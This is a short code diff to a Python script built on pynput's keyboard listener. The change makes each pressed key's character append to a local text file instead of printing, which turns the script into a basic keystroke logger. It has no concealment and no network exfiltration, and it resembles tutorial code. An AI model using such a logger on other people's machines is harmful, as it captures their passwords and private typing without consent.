@@ -2,7 +2,8 @@ from pynput import keyboard
 
 def on_press(key):
     try:
-        print(key.char)
+        with open("./file.txt", "a", encoding="UTF-8") as output_file:
+            output_file.write(key.char)
     except AttributeError:
         if key == keyboard.Key.esc:
             # Stop listener
